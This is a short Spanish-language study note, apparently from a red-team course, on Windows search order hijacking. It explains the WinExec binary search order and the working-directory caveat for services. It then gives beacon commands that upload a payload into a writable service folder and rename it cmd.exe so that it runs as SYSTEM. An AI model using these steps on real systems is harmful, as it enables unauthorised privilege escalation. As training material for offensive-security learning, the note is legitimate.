---
tags: [privesc, windows, path]
---

# Search Order Hijacking

Ocurre cuando una aplicación/servicio llama a un binario con **ruta relativa** (ej. `cmd.exe` en vez de `C:\Windows\System32\cmd.exe`).

## Orden de Búsqueda — WinExec

1. Directorio de ejecución (donde reside el programa)
2. Directorio de trabajo actual
3. `C:\Windows\System32`
4. Directorio System de 16 bits
5. `C:\Windows`
6. Directorios en `PATH`

> [!note]
> Por defecto los servicios de Windows inician con CWD = `C:\Windows\System32`. Secuestrar `cmd.exe` vía PATH generalmente falla en contexto de servicio.

## Explotación

Si la carpeta de instalación del servicio tiene permisos de escritura (ej. `Authenticated Users: Full Control`):

```bash
beacon> cd "C:\Program Files\Bad Windows Service\Service Executable"
beacon> upload C:\Payloads\dns_x64.exe
beacon> mv dns_x64.exe cmd.exe
```

Cuando el servicio arranque y llame a `cmd.exe` sin ruta absoluta → ejecuta nuestro payload con privilegios del servicio (SYSTEM).

